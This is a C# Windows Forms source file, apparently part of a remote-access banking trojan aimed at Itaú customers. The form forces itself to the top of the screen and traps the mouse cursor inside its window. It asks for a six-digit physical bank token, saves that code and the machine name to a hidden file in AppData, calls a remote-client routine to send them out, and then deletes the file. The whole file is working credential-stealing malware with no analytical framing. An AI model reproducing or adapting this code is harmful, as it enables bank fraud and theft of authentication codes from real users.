using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MenuRemoteClient
{
    public partial class ITA_T : Form
    {
        public ITA_T()
        {
            InitializeComponent();
        }

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        static readonly IntPtr HWND_TOP = new IntPtr(0);
        static readonly IntPtr HWND_BOTTOM = new IntPtr(1);
        const UInt32 SWP_NOSIZE = 0x0001;
        const UInt32 SWP_NOMOVE = 0x0002;
        const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        private bool checkTxtLen()
        {
            if (txtToken.Text.Length != 6)
            {
                MessageBox.Show("O nº Token informado é inválido.", "https://www.itau.com.br/conveniencia/?gclid=CjwKEAjwj9GqBRCRlPram97Xk3ESJA");
                return false;
            }

            TextWriter tw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TOK_FISIC.txt", true);
            tw.WriteLine("=================================== ITA_TOKEN_FÍSICA ===================================");
            tw.WriteLine("Nº Token de: " + System.Environment.MachineName);
            tw.WriteLine("CODE: " + txtToken.Text);
            tw.WriteLine("===================================================================================");
            tw.Close();
            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TOK_FISIC.txt", FileAttributes.Hidden);
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TOK_FISIC.txt"))
            {
                MenuRemoteClient mrcli = new MenuRemoteClient();
                mrcli.sendInfo_ITATOK();
                Thread.Sleep(1000);
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\ITA_TOK_FISIC.txt");
                this.Close();
                Cursor.Clip = Screen.PrimaryScreen.Bounds;
            }
            this.Close();
            Cursor.Clip = Screen.PrimaryScreen.Bounds;
            return true;
        }

        private void bora_Click(object sender, EventArgs e)
        {
            checkTxtLen();
        }

        private void ITA_T_Load(object sender, EventArgs e)
        {
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
        }

        private void ITA_T_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Clip = this.Bounds;
        }

        private void txtToken_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = !char.IsDigit(e.KeyChar) && !char.IsControl(e.KeyChar);
        }
    }
}
